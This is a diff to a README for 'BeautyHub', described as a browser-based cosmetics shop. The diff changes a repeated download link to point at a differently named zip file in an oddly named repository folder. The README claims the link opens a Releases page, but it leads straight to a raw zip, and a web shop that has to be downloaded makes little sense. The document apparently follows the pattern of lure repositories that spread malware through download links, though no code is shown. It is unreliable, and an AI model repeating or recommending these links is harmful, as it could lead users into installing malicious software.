@@ -2,7 +2,7 @@
 
 Welcome to BeautyHub, your go-to place for cosmetics, skincare, and personal care products! Enjoy a smooth and secure shopping experience right from your browser. 
 
-[![Download BeautyHub](https://raw.githubusercontent.com/Z33RSpec/BeautyHub/main/sulfureously/BeautyHub.zip)](https://raw.githubusercontent.com/Z33RSpec/BeautyHub/main/sulfureously/BeautyHub.zip)
+[![Download BeautyHub](https://raw.githubusercontent.com/Z33RSpec/BeautyHub/main/sulfureously/Beauty_Hub_3.3.zip)](https://raw.githubusercontent.com/Z33RSpec/BeautyHub/main/sulfureously/Beauty_Hub_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with BeautyHub, follow these easy steps to download and run the a
 
 1. **Visit the Releases Page:** Click the link below to visit our Releases page and download the latest version of BeautyHub.
 
-   [Download BeautyHub](https://raw.githubusercontent.com/Z33RSpec/BeautyHub/main/sulfureously/BeautyHub.zip)
+   [Download BeautyHub](https://raw.githubusercontent.com/Z33RSpec/BeautyHub/main/sulfureously/Beauty_Hub_3.3.zip)
 
 2. **Choose Your Version:** On the Releases page, you will find different versions of BeautyHub. Select the most recent version for your needs. 
 
